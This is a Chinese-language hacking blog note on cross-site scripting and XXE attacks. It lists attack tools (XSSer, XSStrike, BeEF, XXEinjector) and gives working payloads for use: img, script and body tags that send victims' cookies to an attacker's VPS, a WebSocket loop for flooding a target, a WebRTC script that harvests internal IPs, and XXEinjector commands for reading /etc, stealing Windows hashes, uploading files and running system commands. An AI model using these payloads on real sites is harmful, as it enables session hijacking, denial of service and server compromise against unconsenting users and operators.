title: XSS 笔记 XXE工具
author: Believe firmly
tags:
  - web技术
categories: []
date: 2018-12-12 10:08:00
---
### 0*00介绍
危害：盗取cookie、蠕虫、钓鱼
攻击的分类主要有：
存储型： 大多出现在留言板、评论区，用户提交了包含XSS代码的留言到数据库。（持续攻击）
反射型：一般由攻击者构造带有恶意代码参数的 URL（非持久化）
DOM型：同反射，但是没有经过后端处理（非持久化）
<!--more-->
 攻击者在某个表单或者公共区域输入了 可执行的html/js代码，窃取用户信息或者攻击网站，如评论区域
假如我在评论里输入了一段可执行的script，让他弹出 字符（这里的代码可以用过多种方式绕过系统的过滤，正则也可以，多次尝试找到可用的payload），把评论提交，如果没有网站没有做处理的话，那么我的脚本就会当成评论展示给其他人看，但是它在页面执行了，然后大伙一到我的评论页面就会弹出 字符。

### 1*01xss平台与过滤
可以在如下网站快速管理xss里面也有一些常用的模板：
     http://xsspt.com/
bypass的方法可以参看一下下面的这篇文章介绍的很详细：
    https://blog.csdn.net/fly_hps/article/details/79959983 
    
      通过EditThiscookie插件锁定最新添加的cookie可以解决一些本地cookie过期的问题。
![](https://s2.ax1x.com/2019/01/23/kAx9De.png)

### 2*01利用工具
XSSer：是一个自动化框架，用于检测、利用以及报告基于Web应用程序中的XSS漏洞。
应为xsser对python库有依赖建议在linux环境下运行安装环境方便
![](3.png)

```bash
sudo apt-get install python-pycurl python-xmlbuilder python-beautifulsoup python-geoip

###xsser拥有GUI界面
 xsser –gtk
```
XSStrike:他不是像其他工具一样注入有效载荷并检查它的工作原理，而是通过多个解析器分析响应，然后通过与模糊引擎集成的上下文分析来保证有效载荷。

       git clone https://github.com/UltimateHackers/XSStrike/

![](https://camo.githubusercontent.com/905b7baa8b03ada5f9bf32f6f3bbcd67e0944b1b/68747470733a2f2f696d6167652e6962622e636f2f674f4356354c2f53637265656e73686f742d323031382d31312d31392d31332d33332d34392e706e67)

### 2*02Beef
找到了某网站的xss漏洞，通过构造可以bypass的恶意xss代码，插入beefjs代码可以对目标进行更高级的渗透管理beef拥有GUI页面可以方便的的操作，英文不好的小伙伴可以试试i春秋论坛下面的汉化补丁：
![](1.jpg)
注意，在翻译的时候丢了四个引号，相关模块在如下路径，大家再行加上就好了。
![](2.jpg)
链接: https://pan.baidu.com/s/181FGyg4daKp3EGGHkWbycg 提取码: 7iq1



### 3*01 XSS利用多用途

1.获取cookie
img标签
```
<img src=x onerror = document.body.appendChild(document.createElement('img')).setAttribute('src','http://VPS地址:80/?='+document.cookie); >

```
script标签
```
<script>window.location.href='http://VPS地址/?cookie='+document.cookie</script>
```
body标签
```
<body onload=eval(“document.body.appendChild(document.createElement('img')).setAttribute('src','http://VPS地址/?='+document.cookie);”)></body>
```

2.DOS攻击
用到websocket，websocket是HTML5一种新的协议。

```
<script type="text/javascript”>

while (true){ 

var ws = new WebSocket("ws://要攻击的IP地址:端口”);

} 

</script>
```

3.探测内网ip
先利用script获取内网ip然后通过vps转发msg
```
<script>  

function getIPs(callback){

    var ip_arr = [];

    var ip_dups = {};

    var RTCPeerConnection = window.RTCPeerConnection

        || window.mozRTCPeerConnection

        || window.webkitRTCPeerConnection;

    var mediaConstraints = {

        optional: [{RtpDataChannels: true}]

    };

    var servers = undefined;

    if(window.webkitRTCPeerConnection){

        servers = {iceServers: []};      

    }

    var pc = new RTCPeerConnection(servers, mediaConstraints);

    pc.onicecandidate = function(ice){

        if(ice.candidate){

            var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/

            var ip_addr = ip_regex.exec(ice.candidate.candidate)[1];

            if(ip_dups[ip_addr] === undefined)

                callback(ip_addr);

            ip_dups[ip_addr] = true;

        }

    };

    pc.createDataChannel("");

    pc.createOffer(function(result){

        pc.setLocalDescription(result, function(){});

    }, function(){});

}

getIPs(function(ip){ 

    alert(ip);

</script>
```

### XXEinjector 
xml的xxe漏洞是目前Java比较关注的，使用多种直接或间接带外方法来检索文件，目录枚举功能只对Java应用程序有效，而暴力破解攻击需要使用到其他应用程序。
```bash
--host     必填项– 用于建立反向链接的IP地址。(--host=192.168.0.2)
--file      必填项- 包含有效HTTP请求的XML文件。(--file=/tmp/req.txt)
--path           必填项-是否需要枚举目录 – 枚举路径。(--path=/etc)
--brute          必填项-是否需要爆破文件 -爆破文件的路径。(--brute=/tmp/brute.txt)
--logger        记录输出结果。
--rhost          远程主机IP或域名地址。(--rhost=192.168.0.3)
--rport          远程主机的TCP端口信息。(--rport=8080)
--phpfilter    在发送消息之前使用PHP过滤器对目标文件进行Base64编码。
--netdoc     使用netdoc协议。(.
--enumports   枚举用于反向链接的未过滤端口。(--enumports=21,22,80,443,445)
--hashes       窃取运行当前应用程序用户的Windows哈希。
--expect        使用PHP expect扩展执行任意系统命令。(--expect=ls)
--upload       使用Java jar向临时目录上传文件。(--upload=/tmp/upload.txt)
--xslt      XSLT注入测试。
--ssl              使用SSL。
--proxy         使用代理。(--proxy=127.0.0.1:8080)
--httpport Set自定义HTTP端口。(--httpport=80)
--ftpport       设置自定义FTP端口。(--ftpport=21)
--gopherport  设置自定义gopher端口。(--gopherport=70)
--jarport       设置自定义文件上传端口。(--jarport=1337)
--xsltport  设置自定义用于XSLT注入测试的端口。(--xsltport=1337)
--test     该模式可用于测试请求的有效。
--urlencode     URL编码，默认为URI。
--output       爆破攻击结果输出和日志信息。(--output=/tmp/out.txt)
--timeout     设置接收文件/目录内容的Timeout。(--timeout=20)
--contimeout  设置与服务器断开连接的，防止DoS出现。(--contimeout=20)
--fast     跳过枚举询问，有可能出现结果假阳性。
--verbose     显示verbose信息。
```
=====================================

枚举HTTPS应用程序中的/etc目录：
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt –ssl

使用gopher（OOB方法）枚举/etc目录：
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher

二次漏洞利用：
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt--2ndfile=/tmp/2ndreq.txt

使用HTTP带外方法和netdoc协议对文件进行爆破攻击：
ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt--file=/tmp/req.txt --oob=http –netdoc

通过直接性漏洞利用方式进行资源枚举：
ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK

枚举未过滤的端口：
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all

窃取Windows哈希：
ruby XXEinjector.rb--host=192.168.0.2 --file=/tmp/req.txt –hashes

使用Java jar上传文件：
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt--upload=/tmp/uploadfile.pdf

使用PHP expect执行系统指令：
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter--expect=ls

测试XSLT注入：
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt –xslt

记录请求信息：
ruby XXEinjector.rb --logger --oob=http--output=/tmp/out.txt
